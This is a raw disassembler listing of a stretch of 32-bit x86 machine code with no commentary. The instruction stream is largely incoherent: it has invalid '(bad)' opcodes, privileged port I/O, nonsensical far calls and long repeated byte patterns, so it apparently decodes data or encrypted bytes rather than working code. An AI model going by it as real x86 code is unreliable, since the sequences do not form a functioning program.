  435f8b:	outs   dx,DWORD PTR ds:[esi]
  435f8c:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435f92:	pop    esi
  435f93:	call   0xe450c140
  435f98:	cmp    al,0x5e
  435f9a:	bound  esp,QWORD PTR [edx-0x2a]
  435f9d:	or     bx,WORD PTR [edx+0x22d63ac9]
  435fa4:	pop    esi
  435fa5:	call   0x4e70c152
  435faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435fab:	pop    ds
  435fac:	les    ebp,FWORD PTR ds:0x3331750d
  435fb2:	pop    esi
  435fb3:	call   0xbc8c160
  435fb8:	call   0x1369:0x75173ac9
  435fbf:	jne    0x43602a
  435fc1:	shl    bl,cl
  435fc3:	lea    esp,[ebx+0x62]
  435fc6:	bound  edx,QWORD PTR [edi]
  435fc8:	jne    0x436033
  435fca:	or     eax,0xcd0d3175
  435fcf:	imul   edx,DWORD PTR [edi],0x5e31e210
  435fd5:	bound  esp,QWORD PTR [edx-0x12]
  435fd8:	add    eax,0x5e48e20d
  435fdd:	bound  esp,QWORD PTR [edx-0x7b]
  435fe0:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  435fe6:	call   0x755ac193
  435feb:	imul   esp,DWORD PTR [ecx],0x625e18e2
  435ff1:	bound  ebp,QWORD PTR [edi]
  435ff3:	mov    ch,0x1
  435ff5:	imul   ecx,DWORD PTR ds:0x86750d3d,0x5ef3130d
  435fff:	bound  esp,QWORD PTR [edx-0x2a]
  436002:	outs   dx,DWORD PTR ds:[esi]
  436003:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  436009:	pop    esi
  43600a:	call   0x1feac1b7
  43600f:	xchg   ebx,eax
  436010:	outs   dx,BYTE PTR ds:[esi]
  436011:	out    dx,eax
  436012:	popa   
  436013:	popa   
  436014:	popa   
  436015:	or     eax,0x6fd655cd
  43601a:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  436020:	pop    esi
  436021:	call   0x7550c1ce
  436026:	imul   eax,DWORD PTR [ebp-0xd],0x5e50e217
  43602d:	bound  esp,QWORD PTR [edx+0xd]
  436030:	jne    0x435fcc
  436032:	sbb    ah,BYTE PTR [ecx+0x4]
  436035:	loop   0x436088
  436037:	pop    esi
  436038:	bound  esp,QWORD PTR [edx-0x6d]
  43603b:	push   es
  43603c:	loop   0x43608f
  43603e:	pop    esi
  43603f:	bound  esp,QWORD PTR [edx+0xd]
  436042:	int    0x69
  436044:	scas   eax,DWORD PTR es:[edi]
  436045:	pusha  
  436046:	pop    ss
  436047:	adc    ebx,DWORD PTR [eax+0x5e]
  43604a:	bound  esp,QWORD PTR [edx+0xd]
  43604d:	loop   0x436067
  43604f:	pop    esi
  436050:	bound  esp,QWORD PTR [edx-0x7b]
  436053:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  436059:	call   0x1350c206
  43605e:	pop    eax
  43605f:	pop    esi
  436060:	bound  esp,QWORD PTR [edx+0x7f]
  436063:	pusha  
  436064:	or     eax,0x5e31136e
  436069:	bound  esp,QWORD PTR [edx+0xd]
  43606c:	adc    edx,DWORD PTR [eax+0x5e]
  43606f:	bound  esp,QWORD PTR [edx-0x51]
  436072:	pop    ds
  436073:	pop    ss
  436074:	jne    0x4360df
  436076:	or     eax,0x625e3ce2
  43607b:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  436081:	or     eax,0x6e139acd
  436086:	push   0x61a8e85e
  43608b:	pop    ss
  43608c:	jne    0x436028
  43608e:	or     eax,0x625e3ce2
  436093:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  436099:	xor    al,0x5e
  43609b:	call   0xcd50c248
  4360a0:	xchg   BYTE PTR ds:0x86cd1760,ch
  4360a6:	lock int 0x62
  4360a9:	bound  esp,QWORD PTR [edx+0xd]
  4360ac:	loop   0x4360f6
  4360ae:	pop    esi
  4360af:	bound  esp,QWORD PTR [edx-0x7b]
  4360b2:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4360b8:	call   0xcd50c265
  4360bd:	imul   ebp,DWORD PTR [edi+0x2257c71f],0xda5619a
  4360c7:	fs (bad) 
  4360c9:	fs pop ebp
  4360cb:	popa   
  4360cc:	popa   
  4360cd:	popa   
  4360ce:	push   DWORD PTR [ebp+0x1c]
  4360d1:	sub    bh,bh
  4360d3:	jne    0x4360f4
  4360d5:	daa    
  4360d6:	push   DWORD PTR [ebp+0x22]
  4360d9:	adc    al,0xff
  4360db:	jne    0x4360f2
  4360dd:	sub    edi,edi
  4360df:	jne    0x4360da
  4360e1:	push   ds
  4360e2:	push   DWORD PTR [ebp-0xc]
  4360e5:	and    edi,edi
  4360e7:	jne    0x4360e8
  4360e9:	and    bh,bh
  4360eb:	jne    0x43610e
  4360ed:	adc    eax,0x226075ff
  4360f2:	push   DWORD PTR [ebp+0x57]
  4360f5:	pop    ds
  4360f6:	push   DWORD PTR [ebp+0x4e]
  4360f9:	sbb    al,0xff
  4360fb:	jne    0x43614a
  4360fd:	and    edi,edi
  4360ff:	jne    0x43614d
  436101:	(bad)  
  436102:	push   DWORD PTR [ebp+0x53]
  436105:	hlt    
  436106:	push   DWORD PTR [ebp+0x52]
  436109:	stc    
  43610a:	push   DWORD PTR [ebp+0x59]
  43610d:	dec    ebp
  43610e:	push   DWORD PTR [ebp+0x58]
  436111:	dec    esi
  436112:	push   DWORD PTR [ebp+0x4f]
  436115:	push   edi
  436116:	push   DWORD PTR [ebp+0x46]
  436119:	pusha  
  43611a:	push   DWORD PTR [ebp+0x45]
  43611d:	pop    ecx
  43611e:	push   DWORD PTR [ebp+0x28]
  436121:	push   edx
  436122:	push   DWORD PTR [ebp+0x2b]
  436125:	push   ebx
  436126:	push   DWORD PTR [ebp+0x26]
  436129:	dec    esp
  43612a:	push   DWORD PTR [ebp+0x51]
  43612d:	inc    ebp
  43612e:	push   DWORD PTR [ebp+0x50]
  436131:	inc    esi
  436132:	push   DWORD PTR [ebp+0x47]
  436135:	dec    edi
  436136:	push   DWORD PTR [ebp+0x3e]
  436139:	push   DWORD PTR ds:[ebp+0x3d]
  43613d:	inc    edi
  43613e:	push   DWORD PTR [ebp+0x3c]
  436141:	push   eax
  436142:	push   DWORD PTR [ebp+0x43]
  436145:	dec    ecx
  436146:	push   DWORD PTR [ebp+0x42]
  436149:	inc    edx
  43614a:	push   DWORD PTR [ebp+0x49]
  43614d:	inc    ebx
  43614e:	push   DWORD PTR [ebp+0x48]
  436151:	cmp    al,0xff
  436153:	jne    0x436194
  436155:	xor    eax,0x363675ff
  43615a:	push   DWORD PTR [ebp+0x35]
  43615d:	aas    
  43615e:	push   DWORD PTR [ebp+0x18]
  436161:	dec    eax
  436162:	push   DWORD PTR [ebp+0x1b]
  436165:	ret    0x75ff
  436168:	push   ss
  436169:	push   ss
  43616a:	push   DWORD PTR [ebp-0x3e]
  43616d:	sbb    edi,edi
  43616f:	jne    0x436164
  436171:	sbb    bh,bh
  436173:	jne    0x436165
  436175:	out    dx,al
  436176:	push   DWORD PTR [ebp-0xf]
  436179:	icebp  
  43617a:	push   DWORD PTR [ebp-0x12]
  43617d:	lock push DWORD PTR [ebp+0x64]
  436181:	repz push DWORD PTR [ebp-0x14]
  436185:	cli    
  436186:	push   DWORD PTR [ebp-0x13]
  436189:	in     eax,dx
  43618a:	push   DWORD PTR [ebp-0x6]
  43618d:	in     al,dx
  43618e:	push   DWORD PTR [ebp+0x31]
  436191:	push   DWORD PTR fs:[ebp+0x6f]
  436195:	push   DWORD PTR gs:[ebp+0x66]
  436199:	push   WORD PTR [ebp+0x65]
  43619d:	outs   dx,DWORD PTR ds:[esi]
  43619e:	push   DWORD PTR [ebp+0x5d]
  4361a1:	scas   al,BYTE PTR es:[edi]
  4361a2:	push   DWORD PTR [ebp+0x44]
  4361a5:	mov    ebx,0xb04b75ff
  4361aa:	push   DWORD PTR [ebp+0x4a]
  4361ad:	and    al,0xff
  4361af:	jne    0x43621a
  4361b1:	mov    edx,0xb73075ff
  4361b6:	push   DWORD PTR [ebp+0x67]
  4361b9:	lods   al,BYTE PTR ds:[esi]
  4361ba:	push   DWORD PTR [ebp+0x5e]
  4361bd:	mov    cl,0xff
  4361bf:	jne    0x436216
  4361c1:	and    eax,0xb35c75ff
  4361c6:	push   DWORD PTR [ebp+0x63]
  4361c9:	std    
  4361ca:	push   DWORD PTR [ebp+0x62]
  4361cd:	push   esp
  4361ce:	fcomp  DWORD PTR [ebx-0x6a]
  4361d1:	bound  esp,QWORD PTR [edx+0x62]
  4361d4:	popa   
  4361d5:	out    dx,al
  4361d6:	lea    ecx,ds:0x626296e2
  4361dc:	bound  esp,QWORD PTR [edx+0x6296e217]
  4361e2:	bound  esp,QWORD PTR [edx-0x28]
  4361e5:	and    edx,DWORD PTR [esi-0x5d9d9d9e]
  4361eb:	jae    0x436226
  4361ed:	or     eax,0x626296e2
  4361f2:	bound  edx,QWORD PTR [ebx+0x1c342c06]
  4361f8:	test   eax,ebx
  4361fa:	popa   
  4361fb:	popa   
  4361fc:	popa   
  4361fd:	fcomp  DWORD PTR [edx+ebx*4]
  436200:	add    al,0xe2
  436202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436203:	bound  esp,QWORD PTR [edx+0x62]
  436206:	xchg   ebx,eax
  436207:	push   es
  436208:	loop   0x4361b1
  43620a:	bound  esp,QWORD PTR [edx+0x62]
  43620d:	sbb    dl,BYTE PTR [ebx]
  43620f:	xchg   esi,eax
  436210:	bound  esp,QWORD PTR [edx+0x62]
  436213:	add    al,0x10
  436215:	xor    al,0xa2
  436217:	bound  esp,QWORD PTR [edx+0x62]
  43621a:	out    dx,al
  43621b:	sbb    eax,0x62725bd8
  436220:	bound  esp,QWORD PTR [edx+0x61]
  436223:	fcomp  DWORD PTR [ebx-0x62]
  436226:	bound  esp,QWORD PTR [edx+0x62]
  436229:	popa   
  43622a:	or     eax,0x626272e2
  43622f:	bound  esp,QWORD PTR [edi-0x276c798b]
  436235:	ficomp DWORD PTR [edi+0x61]
  436238:	popa   
  436239:	or     eax,0xe2569a75
  43623e:	jb     0x4362a2
  436240:	bound  esp,QWORD PTR [edx-0x6d]
  436243:	push   es
  436244:	popa   
  436245:	fsubr  DWORD PTR [ecx-0x63]
  436248:	mov    dl,0x7c
  43624a:	or     eax,0x626272e2
  43624f:	(bad)  
  436250:	fmul   DWORD PTR [eax+0x61]
  436253:	pop    ss
  436254:	loop   0x4361e0
  436256:	bound  esp,QWORD PTR [edx+0x62]
  436259:	or     eax,0x626272e2
  43625e:	bound  esp,QWORD PTR [edx+0x6272e217]
  436264:	bound  esp,QWORD PTR [edx-0x12]
  436267:	add    cl,BYTE PTR ds:0xe2569a75
  43626d:	jb     0x4362d1
  43626f:	bound  esp,QWORD PTR [edx-0x6d]
  436272:	push   es
  436273:	popa   
  436274:	xchg   ebx,eax
  436275:	push   es
  436276:	outs   dx,BYTE PTR ds:[esi]
  436277:	xor    al,0xa2
  436279:	bound  esp,QWORD PTR [edx+0x62]
  43627c:	pop    ss
  43627d:	loop   0x436209
  43627f:	bound  esp,QWORD PTR [edx+0x62]
  436282:	or     eax,0x626272e2
  436287:	bound  esp,QWORD PTR [edx+0x6272e217]
  43628d:	bound  esp,QWORD PTR [edx+0xd]
  436290:	loop   0x43621c
  436292:	bound  esp,QWORD PTR [edx+0x62]
  436295:	pop    ss
  436296:	loop   0x43630e
  436298:	bound  esp,QWORD PTR [edx+0x62]
  43629b:	or     eax,0xe2569a75
  4362a0:	jb     0x436304
  4362a2:	bound  esp,QWORD PTR [edx-0x6d]
  4362a5:	push   es
  4362a6:	popa   
  4362a7:	fsubr  DWORD PTR [ecx-0x63]
  4362aa:	mov    dl,0x7c
  4362ac:	or     eax,0x626272e2
  4362b1:	(bad)  
  4362b2:	fmul   DWORD PTR [eax+0x61]
  4362b5:	pop    ss
  4362b6:	loop   0x436336
  4362b8:	bound  esp,QWORD PTR [edx+0x62]
  4362bb:	or     eax,0x626272e2
  4362c0:	bound  esp,QWORD PTR [edx+0x6272e217]
  4362c6:	bound  esp,QWORD PTR [edx-0x12]
  4362c9:	add    cl,BYTE PTR ds:0xe2569a75
  4362cf:	jb     0x436333
  4362d1:	bound  esp,QWORD PTR [edx-0x6d]
  4362d4:	push   es
  4362d5:	popa   
  4362d6:	xchg   ebx,eax
  4362d7:	push   es
  4362d8:	outs   dx,BYTE PTR ds:[esi]
  4362d9:	xor    al,0xa2
  4362db:	bound  esp,QWORD PTR [edx+0x62]
  4362de:	pop    ss
  4362df:	loop   0x43635f
  4362e1:	bound  esp,QWORD PTR [edx+0x62]
  4362e4:	or     eax,0x626272e2
  4362e9:	bound  esp,QWORD PTR [edx+0x6272e217]
  4362ef:	bound  esp,QWORD PTR [edx+0xd]
  4362f2:	loop   0x436372
  4362f4:	bound  esp,QWORD PTR [edx+0x62]
  4362f7:	pop    ss
  4362f8:	loop   0x4362f5
  4362fa:	bound  esp,QWORD PTR [edx+0x62]
  4362fd:	or     eax,0xe2569a75
  436302:	jb     0x436366
  436304:	bound  esp,QWORD PTR [edx-0x6d]
  436307:	push   es
  436308:	popa   
  436309:	fsubr  DWORD PTR [ecx-0x63]
  43630c:	mov    dl,0x7c
  43630e:	or     eax,0x626272e2
  436313:	(bad)  
  436314:	fmul   DWORD PTR [eax+0x61]
  436317:	pop    ss
  436318:	loop   0x4362ac
  43631a:	bound  esp,QWORD PTR [edx+0x62]
  43631d:	or     eax,0x626272e2
  436322:	bound  esp,QWORD PTR [edx+0x6272e217]
  436328:	bound  esp,QWORD PTR [edx-0x12]
  43632b:	add    cl,BYTE PTR ds:0xe2569a75
  436331:	jb     0x436395
  436333:	bound  esp,QWORD PTR [edx-0x6d]
  436336:	push   es
  436337:	popa   
  436338:	xchg   ebx,eax
  436339:	push   es
  43633a:	outs   dx,BYTE PTR ds:[esi]
  43633b:	xor    al,0xa2
  43633d:	bound  esp,QWORD PTR [edx+0x62]
  436340:	pop    ss
  436341:	loop   0x4362d5
  436343:	bound  esp,QWORD PTR [edx+0x62]
  436346:	or     eax,0x626272e2
  43634b:	bound  esp,QWORD PTR [edx+0x6272e217]
  436351:	bound  esp,QWORD PTR [edx+0xd]
  436354:	loop   0x4362e8
  436356:	bound  esp,QWORD PTR [edx+0x62]
  436359:	pop    ss
  43635a:	loop   0x4362ea
  43635c:	bound  esp,QWORD PTR [edx+0x62]
  43635f:	or     eax,0xe2569a75
  436364:	jb     0x4363c8
  436366:	bound  esp,QWORD PTR [edx-0x6d]
  436369:	push   es
  43636a:	popa   
  43636b:	fsubr  DWORD PTR [ecx-0x63]
  43636e:	mov    dl,0x7c
  436370:	or     eax,0x626272e2
  436375:	(bad)  
  436376:	fmul   DWORD PTR [eax+0x61]
  436379:	pop    ss
  43637a:	loop   0x436302
  43637c:	bound  esp,QWORD PTR [edx+0x62]
  43637f:	or     eax,0x626272e2
  436384:	bound  esp,QWORD PTR [edx+0x6272e217]
  43638a:	bound  esp,QWORD PTR [edx-0x12]
  43638d:	add    cl,BYTE PTR ds:0xe2569a75
  436393:	jb     0x4363f7
  436395:	bound  esp,QWORD PTR [edx-0x6d]
  436398:	push   es
  436399:	popa   
  43639a:	xchg   ebx,eax
  43639b:	push   es
  43639c:	outs   dx,BYTE PTR ds:[esi]
  43639d:	xor    al,0xa2
  43639f:	bound  esp,QWORD PTR [edx+0x62]
  4363a2:	pop    ss
  4363a3:	loop   0x43632b
  4363a5:	bound  esp,QWORD PTR [edx+0x62]
  4363a8:	or     eax,0x626272e2
  4363ad:	bound  esp,QWORD PTR [edx+0x6272e217]
  4363b3:	bound  esp,QWORD PTR [edx+0xd]
  4363b6:	loop   0x43633e
  4363b8:	bound  esp,QWORD PTR [edx+0x62]
  4363bb:	pop    ss
  4363bc:	loop   0x436364
  4363be:	bound  esp,QWORD PTR [edx+0x62]
  4363c1:	or     eax,0x626276e2
  4363c6:	bound  ebx,QWORD PTR [edi]
  4363c8:	dec    eax
  4363c9:	mov    BYTE PTR ds:0x6262fb13,cl
  4363cf:	bound  ebx,QWORD PTR [edi]
  4363d1:	aas    
  4363d2:	xchg   BYTE PTR [esi+0x1f],dl
  4363d5:	or     eax,0x62628e13
  4363da:	bound  ebx,QWORD PTR [edi]
  4363dc:	aas    
  4363dd:	cmp    edx,DWORD PTR [esi-0x1e]
  4363e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4363e1:	bound  esp,QWORD PTR [edx+0x62]
  4363e4:	push   esi
  4363e5:	pusha  
  4363e6:	pop    ss
  4363e7:	adc    edi,DWORD PTR [eax]
  4363e9:	bound  esp,QWORD PTR [edx+0x62]
  4363ec:	or     eax,0x62629ee2
  4363f1:	bound  esp,QWORD PTR [edi-0x2b8c818b]
  4363f7:	or     eax,0x626238e2
  4363fc:	bound  ebx,QWORD PTR [edi]
  4363fe:	repz xchg edx,eax
  436400:	aad    0x62
  436402:	popa   
  436403:	popa   
  436404:	popa   
  436405:	or     eax,0x135692cd
  43640a:	sahf   
  43640b:	bound  esp,QWORD PTR [edx+0x62]
  43640e:	add    al,0x68
  436410:	or     eax,0x62629ee2
  436415:	bound  esp,QWORD PTR [edx+0x629ee217]
  43641b:	bound  esp,QWORD PTR [edx+0xd]
  43641e:	loop   0x4363be
  436420:	bound  esp,QWORD PTR [edx+0x62]
  436423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436424:	jne    0x4364a4
  436426:	jae    0x4363fc
  436428:	or     eax,0x626238e2
  43642d:	bound  ebx,QWORD PTR [edi]
  43642f:	repz call 0xd61:0x616162d5
  436437:	int    0x92
  436439:	push   esi
  43643a:	adc    ebx,DWORD PTR [esi+0x4626262]
  436440:	push   0x629ee20d
  436445:	bound  esp,QWORD PTR [edx-0x5e]
  436448:	pop    ss
  436449:	loop   0x4363e9
  43644b:	bound  esp,QWORD PTR [edx+0x62]
  43644e:	or     eax,0x62629ee2
  436453:	bound  esp,QWORD PTR [edi+0x7f737e75]
  436459:	or     eax,0x626238e2
  43645e:	(bad)  
  43645f:	aad    0x62
  436461:	popa   
  436462:	popa   
  436463:	popa   
  436464:	or     eax,0x135692cd
  436469:	sahf   
  43646a:	bound  esp,QWORD PTR [edx+0x62]
  43646d:	add    al,0x68
  43646f:	or     eax,0x62629ee2
  436474:	bound  esp,QWORD PTR [edx+0x629ee217]
  43647a:	bound  esp,QWORD PTR [edx-0x10]
  43647d:	mov    al,0x5c
  43647f:	bound  esp,QWORD PTR [edx+0x57]
  436482:	and    dl,BYTE PTR [edx+0x640da561]
  436488:	leave  
  436489:	fcom   DWORD PTR [ebp+0x750d6155]
  43648f:	call   0xa206:0x93867556
  436496:	(bad)  
  436497:	fsubr  DWORD PTR [ecx-0x63]
  43649a:	mov    dl,0x3a
  43649c:	or     eax,0x17a25575
  4364a1:	jne    0x4364f8
  4364a3:	or     eax,0x75569a75
  4364a8:	xchg   BYTE PTR [ebx-0x279c5dfa],dl
  4364ae:	imul   ebx,DWORD PTR [ebp+0x750d3ab2],0x7517a255
  4364b8:	push   ebp
  4364b9:	or     eax,0xf31f8675
  4364be:	pop    edi
  4364bf:	jnp    0x4364dd
  4364c1:	push   esi
  4364c2:	sub    eax,0x22575575
  4364c7:	.byte 0x9a
  4364c8:	popa   
